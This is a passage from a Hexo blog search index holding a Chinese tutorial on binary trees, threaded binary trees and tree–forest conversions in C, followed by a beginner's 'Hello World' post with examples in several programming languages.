  <span class="token operator">*</span>T <span class="token operator">=</span> <span class="token punctuation">(</span>BTree<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>BTNode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">*</span>T<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token punctuation">(</span><span class="token operator">*</span>T<span class="token punctuation">)</span><span class="token operator">-></span>data <span class="token operator">=</span> ch<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//生成根结点</span>        <span class="token function">CreateBTree</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token operator">*</span>T<span class="token punctuation">)</span><span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//构造左子树</span>        <span class="token function">CreateBTree</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token operator">*</span>T<span class="token punctuation">)</span><span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//构造右子树</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="统计二叉树叶子结点的数目"><a href="#统计二叉树叶子结点的数目" class="headerlink" title="统计二叉树叶子结点的数目"></a>统计二叉树叶子结点的数目</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">Leafnodenum</span><span class="token punctuation">(</span>BTree T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//统计二叉树叶子结点的数目</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>T<span class="token operator">-></span>lchild <span class="token operator">==</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> T<span class="token operator">-></span>rchild <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            count1<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//全局变量计数，初始化为0</span>        <span class="token punctuation">}</span>        <span class="token function">Leafnodenum</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//递归统计左子树叶子结点的数量</span>        <span class="token function">Leafnodenum</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//递归统计右子树叶子结点的数量</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="统计二叉树结点总数"><a href="#统计二叉树结点总数" class="headerlink" title="统计二叉树结点总数"></a>统计二叉树结点总数</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">Nodetotalnum</span><span class="token punctuation">(</span>BTree T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//统计二叉树结点总数</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        count2<span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//全局变量计数，初始化为0</span>        <span class="token function">Nodetotalnum</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//递归统计左子树结点数</span>        <span class="token function">Nodetotalnum</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//递归统计右子树结点数</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="求二叉树的深度"><a href="#求二叉树的深度" class="headerlink" title="求二叉树的深度"></a>求二叉树的深度</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">TreeDepth</span><span class="token punctuation">(</span>BTree T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//求二叉树的深度</span><span class="token punctuation">{</span>    <span class="token keyword">int</span>  ldep<span class="token punctuation">,</span> rdep<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义两个整型变量，用以存放左、右子树的深度</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>T <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        ldep <span class="token operator">=</span> <span class="token function">TreeDepth</span><span class="token punctuation">(</span>T<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//递归统计左子树深度</span>        rdep <span class="token operator">=</span> <span class="token function">TreeDepth</span><span class="token punctuation">(</span>T<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//递归统计右子树深度</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ldep <span class="token operator">></span> rdep<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> ldep <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> rdep <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h2><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p><strong>对于一个有n个结点的二叉链表，每个结点有指向左右孩子的两个指针域，所以一共是2n个指针域，而n个结点的</strong></p><p><strong>二叉树一共有n-1条分支线数，也就是说，其实是存在2n-(n-1) = n+1个空指针域，这些空间不存储任何事物，白</strong></p><p><strong>白地浪费内存资源；因此，提出一种方法，利用原来的空指针域存放指针，指向树中其他结点；</strong></p><h3 id="定义-13"><a href="#定义-13" class="headerlink" title="定义"></a>定义</h3><p><strong>二叉树中所有空指针域的lchild，改为指向当前结点的前驱，把空指针域中的rchild，改为指向结点的后继；</strong></p><p><strong>我们把指向前驱和后继的指针叫做线索 ，加上线索的二叉树就称之为线索二叉树。</strong></p><h3 id="线索化"><a href="#线索化" class="headerlink" title="线索化"></a>线索化</h3><p><strong>我们对二叉树以某种次序遍历使其变为线索二叉树的过程称作是线索化；</strong></p><h3 id="存储结构-2"><a href="#存储结构-2" class="headerlink" title="存储结构"></a>存储结构</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span>  <span class="token comment" spellcheck="true">//这个是一个枚举类型</span><span class="token punctuation">{</span>    Link<span class="token punctuation">,</span>Thread <span class="token comment" spellcheck="true">//Link=0表示指向左右孩子指针，Thread表示指向前驱或后继的线索</span><span class="token punctuation">}</span>PointerTag<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> BThrTreeNode <span class="token comment" spellcheck="true">//二叉线索存储结点结构</span><span class="token punctuation">{</span>    DataType data<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//结点数据</span>    <span class="token keyword">struct</span> BThrTreeNode<span class="token operator">*</span> lchild<span class="token punctuation">,</span> <span class="token operator">*</span> rchild<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//左右孩子指针</span>    PointerTag L_Tag<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//左右标志</span>    PointerTag R_Tag<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//左右标志</span><span class="token punctuation">}</span>BThrTreeNode<span class="token punctuation">,</span> <span class="token operator">*</span> BThrTree<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以线索化的过程就是在遍历的过程中修改空指针的过程=_=</p><h3 id="中序遍历线索化"><a href="#中序遍历线索化" class="headerlink" title="中序遍历线索化"></a>中序遍历线索化</h3><pre class="line-numbers language-c"><code class="language-c">BThrTree pre<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//全局变量，始终指向刚刚访问过的结点</span><span class="token keyword">void</span> <span class="token function">InThreading</span><span class="token punctuation">(</span>BThrTree p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//中序遍历进行中序线索化</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">InThreading</span><span class="token punctuation">(</span>p<span class="token operator">-></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//递归左子树线索化</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>p<span class="token operator">-></span>lchild<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//没有左孩子</span>        <span class="token punctuation">{</span>            p<span class="token operator">-></span>L_Tag <span class="token operator">=</span> Thread<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//前驱线索</span>            p<span class="token operator">-></span>lchild <span class="token operator">=</span> pre<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//左孩子指针指向前驱</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pre<span class="token operator">-></span>rchild<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//前驱没有右孩子</span>        <span class="token punctuation">{</span>            pre<span class="token operator">-></span>R_Tag <span class="token operator">=</span> Thread<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后继线索</span>            pre<span class="token operator">-></span>rchild <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//前驱右孩子指针指向后继（当前结点p）</span>        <span class="token punctuation">}</span>        pre <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//保持pre指向p的前驱</span>        <span class="token function">InThreading</span><span class="token punctuation">(</span>p<span class="token operator">-></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//递归右子树线索化</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="中序遍历线索二叉树"><a href="#中序遍历线索二叉树" class="headerlink" title="中序遍历线索二叉树"></a>中序遍历线索二叉树</h3><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">//T指向头结点，头结点左链lchild指向根结点，头结点右链rchild指向中序遍历的最后一个结点</span><span class="token keyword">int</span> <span class="token function">InOrderTraverse_Thr</span><span class="token punctuation">(</span>BThrTree T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//中序遍历二叉线索链表表示的二叉树</span><span class="token punctuation">{</span>    BThrTree p<span class="token punctuation">;</span>    p <span class="token operator">=</span> T<span class="token operator">-></span>lchild<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p指向根结点</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> T<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//空树或者遍历结束时，p==T</span>    <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>L_Tag <span class="token operator">==</span> Link<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//当L_Tag==0时循环到中序序列第一个结点</span>        <span class="token punctuation">{</span>            p <span class="token operator">=</span> p<span class="token operator">-></span>lchild<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//显示结点数据，可以更改为其他对结点操作</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>p<span class="token operator">-></span>R_Tag <span class="token operator">==</span> Thread <span class="token operator">&amp;&amp;</span> p<span class="token operator">-></span>rchild <span class="token operator">!=</span> T<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            p <span class="token operator">=</span> p<span class="token operator">-></span>rchild<span class="token punctuation">;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        p <span class="token operator">=</span> p<span class="token operator">-></span>rchild<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//p进至其右子树根</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="树、森林与二叉树的转换"><a href="#树、森林与二叉树的转换" class="headerlink" title="树、森林与二叉树的转换"></a>树、森林与二叉树的转换</h2><p>前面已经见过树的定义和存储结构，对于树来讲，可以是任意形状，一个结点可以有很多孩子，复杂很多，于是引</p><p>入了二叉树，这个就方便很多了；二叉树只有左右两个孩子，这样的话，面对的变化就少了，如果所有的树都能变</p><p>成二叉树就好了😅别说，还真可以：</p><h3 id="树转换为二叉树"><a href="#树转换为二叉树" class="headerlink" title="树转换为二叉树"></a>树转换为二叉树</h3><p>一般来讲，树转换为二叉树有以下几步：</p><p>1、加线：在所有兄弟结点之间加一条线；</p><p>2、去线：对树中的每个结点，只保留它与第一个孩子结点之间的连线，删除它与其他孩子结点之间的连线；</p><p>3、旋转：以树的根节点为轴心，将整棵树顺时针旋转45°，使之成为二叉树；</p><p><strong>如图所示：</strong></p><p><img src="/images/%E6%A0%91%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="树转换为二叉树"></p><h3 id="森林转换为二叉树"><a href="#森林转换为二叉树" class="headerlink" title="森林转换为二叉树"></a>森林转换为二叉树</h3><p>森林是由若干棵树组成的，所以完全可以理解为，森林中的每一棵树都是兄弟，可以按照兄弟的处理办法来操作，方法如下：</p><p>1、把每棵树转换成二叉树；</p><p>2、第一棵二叉树不动，从第二棵二叉树开始，依次把后一棵二叉树的根结点作为前一棵树的根结点的右孩子，用</p><p>线连接起来，当所有的二叉树连接起来后就得到了由森林转换来的二叉树；</p><p><strong>如图所示：</strong></p><p><img src="/images/%E6%A3%AE%E6%9E%97%E8%BD%AC%E6%8D%A2%E4%B8%BA%E4%BA%8C%E5%8F%89%E6%A0%91.png" alt="森林转换为二叉树"></p><h3 id="二叉树还原为树"><a href="#二叉树还原为树" class="headerlink" title="二叉树还原为树"></a>二叉树还原为树</h3><p>二叉树还原为树就是树转换为二叉树的逆过程，直接反过来做就可以</p><p>步骤如下：</p><p>1、加线：若某结点的左孩子结点存在，则将这个左孩子的右孩子结点，右孩子的右孩子结点，右孩子的右孩子的</p><p>右孩子结点….哈哈，就是左孩子的n个右孩子结点都作为结点的孩子，将该结点与这些右孩子结点用线连接起来；</p><p>2、去线：删除原二叉树中所有结点与其右孩子结点的连线；</p><p>3、旋转：旋转得到树</p><p><strong>如图所示：</strong></p><p><img src="/images/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%98%E5%8E%9F%E4%B8%BA%E6%A0%91.png" alt="二叉树还原为树"></p><h3 id="二叉树还原为森林"><a href="#二叉树还原为森林" class="headerlink" title="二叉树还原为森林"></a>二叉树还原为森林</h3><p>判断一棵二叉树能够转换成树还是森林，很简单，只要看这棵二叉树的根结点有没有右孩子，有就是森林，没有就</p><p>是一棵树，如果是森林，步骤如下：</p><p>1、从根结点开始，若右孩子存在，则把它与右孩子结点的连线删除，再查看分离后的二叉树，若右孩子存在，则</p><p>连线删除……，直到所有右孩子连线都删除为止，得到分离的二叉树；</p><p>2、再将每棵分离后的二叉树转换为树即可；</p><p><strong>如图所示：</strong></p><p><img src="/images/%E4%BA%8C%E5%8F%89%E6%A0%91%E8%BF%98%E5%8E%9F%E4%B8%BA%E6%A3%AE%E6%9E%97.png" alt="二叉树还原为森林"></p><h2 id="赫夫曼树"><a href="#赫夫曼树" class="headerlink" title="赫夫曼树"></a>赫夫曼树</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/02/14/hello-world/"/>
      <url>/2020/02/14/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to Hexo！！</p><p>我是一名计算机小白，这是我的第一篇博客，不足之处，请多指教；</p><p>学习语言最基本了解它大概长什么样子，下面通过打印Hello World！来了解了解；</p><a id="more"></a><h4 id="打印”Hello-World-”"><a href="#打印”Hello-World-”" class="headerlink" title="打印”Hello World!”"></a>打印”Hello World!”</h4><h5 id="C"><a href="#C" class="headerlink" title="C"></a>C</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h5><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Hello World!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h5><pre class="line-numbers language-Java"><code class="language-Java">public class HelloWorld {    public static void main(String[] args) {        System.out.println("Hello World!");    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h5><pre class="line-numbers language-Python"><code class="language-Python">print("Hello World!");<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h5><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">echo</span> <span class="token string">"Hello World!"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="C-2"><a href="#C-2" class="headerlink" title="C#"></a>C#</h5><pre class="line-numbers language-c#"><code class="language-c#">using System;namespace HelloWorld{    class HelloWorld    {        static void Main(string[] args){            Console.WriteLine("Hello World!");        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Testing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Testing </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
